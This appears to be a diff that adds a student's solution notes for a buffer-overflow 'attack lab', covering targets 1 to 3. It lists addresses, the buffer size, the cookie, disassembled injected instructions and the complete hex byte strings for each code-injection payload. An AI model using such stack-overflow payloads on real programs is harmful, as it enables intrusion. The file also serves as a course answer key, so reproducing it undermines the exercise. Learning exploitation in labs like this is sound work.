@@ -1,0 +1,53 @@
+Target1:
+    Address of touch1: 0x4017c0
+    Normal ret address store at:  0x5561dca0
+    Address of buf = 0x5561dc78 
+    size of buf = 0x28 = 40 (bytes)
+
+    shellcode = 
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 
+    C0 17 40 00
+
+Target2: 
+    Address of touch2: 0x4017ec
+    size of buf = 40 (bytes)
+    cookie = 0x59b997fa
+    
+    0000000000000000 <.text>:
+    0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+    7:	68 ec 17 40 00       	pushq  $0x4017ec
+    c:	c3                   	retq   
+    
+    shellcode = 
+    48 c7 c7 fa 97 b9 59 68
+    ec 17 40 00 c3 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    78 dc 61 55
+
+Target3:
+    Address of touch3: 0x4018fa
+    Address of buf = 0x5561dc78 
+    Our string store at: 0x5561dca8
+    cookie = 0x59b997fa
+    ASCII for string: 35 39 62 39 39 37 66 61 00
+
+
+    0000000000000000 <.text>:
+    0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
+    7:	68 fa 18 40 00       	pushq  $0x4018fa
+    c:	c3                   	retq  
+
+    shellcode: 
+    48 c7 c7 a8 dc 61 55 68 
+    fa 18 40 00 c3 00 00 00
+    00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00 
+    78 dc 61 55 00 00 00 00
+    35 39 62 39 39 37 66 61
